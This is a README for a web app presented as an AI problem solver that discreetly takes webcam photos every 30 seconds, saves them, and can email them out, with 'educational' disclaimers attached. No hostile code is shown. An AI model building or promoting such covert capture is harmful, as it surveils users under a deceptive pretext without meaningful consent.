# 🧠 Solve It — AI-Powered Problem Solver

![Solve It Banner](https://img.shields.io/badge/Solve%20It-AI%20Problem%20Solver-7b6fff?style=for-the-badge)

> **Solve any problem in seconds.** AI-powered intelligence with continuous session security monitoring.
> 
> ⚠️ **IMPORTANT**: This project is intended **for ethical and educational purposes only**. It demonstrates AI problem-solving and security-monitoring concepts in a controlled learning environment. Any use for unauthorized surveillance, invasion of privacy, or illegal/unethical activity is strictly prohibited. By using this software, you agree to use it responsibly and in compliance with all applicable laws.

---

## ✨ Overview

**Solve It** is a cutting-edge AI problem-solving platform that tackles coding challenges, mathematical equations, logical puzzles, creative projects, business strategy, and beyond. Built with a focus on both intelligence and security, it features continuous session monitoring via camera capture to ensure platform integrity.

### ⚠️ Ethical & Knowledge Purpose

This project is created **for educational and knowledge-sharing purposes only**. It demonstrates:

- Full-stack web application architecture (Node.js/Express + vanilla JS)
- WebRTC camera integration and media stream handling
- AI-powered chat interface patterns
- 3D canvas animation techniques
- Session security monitoring concepts

**You are encouraged to** study the code, learn from the architecture, and adapt the non-security-related components for your own ethical projects. **You must not** deploy the camera-monitoring features in any real-world environment without explicit informed consent from all parties.

### 🎯 Key Capabilities

| Domain | Description |
|--------|-------------|
| 🧮 **Advanced Mathematics** | Calculus, algebra, statistics, number theory — step-by-step solutions |
| 💻 **Code & Debugging** | 50+ programming languages, production-ready solutions |
| 🔬 **Science & Research** | Physics, chemistry, biology — AI-powered explanations |
| 📊 **Business Intelligence** | Strategy, market research, financial modeling |
| ✍️ **Writing & Language** | Essays, reports, translation, 50+ languages |
| 🎯 **Logic & Puzzles** | Riddles, brain teasers, algorithmic challenges |

---

## 🏗️ Architecture

```
📁 AI-WITH-CAMERA-CAPTURE/
│
├── server.js          # Express backend (Node.js)
├── app.js             # Frontend application logic
├── galaxy.js          # 3D galaxy background animation
├── index.html         # Main HTML entry point
├── style.css          # Complete stylesheet
├── package.json       # Project dependencies
├── captures/          # Saved camera captures (auto-created)
└── README.md          # You are here
```

### 🔧 Tech Stack

- **Backend**: Node.js + Express 5
- **Frontend**: Vanilla JavaScript + CSS3
- **Security**: Web3Forms API for email alerts
- **3D Graphics**: Canvas-based galaxy simulation
- **Camera**: WebRTC (`getUserMedia`)

---

## 🚀 Getting Started

### Prerequisites

- Node.js >= 18
- npm

### Installation

```bash
# Clone the repository
git clone https://github.com/your-username/solve-it.git
cd solve-it

# Install dependencies
npm install

# Start the server
node server.js
```

Navigate to **http://localhost:4000** in your browser.

### 🖥️ Usage Flow

1. **Accept Terms & Conditions** — Camera permission is requested for session security
2. **Periodic Captures** — Every 30 seconds, the app discreetly captures a photo for identity verification
3. **Start Solving** — Use the AI chat interface to ask anything
4. **Profile** — View your captured identity and session stats

---

## 📡 API Endpoints

### `POST /save-capture`

Receives base64 image data from the frontend camera capture.

**Request Body:**
```json
{
  "image": "data:image/jpeg;base64,..."
}
```

**Response:**
```json
{
  "success": true,
  "filename": "capture_2026-07-25T13-14-44-876Z.jpeg"
}
```

Captures are saved locally to `/captures` and optionally forwarded via Web3Forms email API.

---

## 👤 Author

**DHRUMIL CHAUDHARY**

[![GitHub](https://img.shields.io/badge/GitHub-dhrumil--chaudhary-7b6fff?style=flat-square&logo=github)](https://github.com/dhrumil-chaudhary)

---

## 📄 License

This project is proprietary software. All rights reserved.

---

## ⚠️ Security Notice

Solve It performs **continuous session monitoring** using the device camera for security and anti-fraud purposes. Captured images are stored securely and used only for identity verification during active sessions.

---

<p align="center">
  <sub>Built with ❤️ by <strong>DHRUMIL CHAUDHARY</strong></sub>
  <br>
  <sub>© 2026 Solve It Technologies Pvt. Ltd.</sub>
</p>
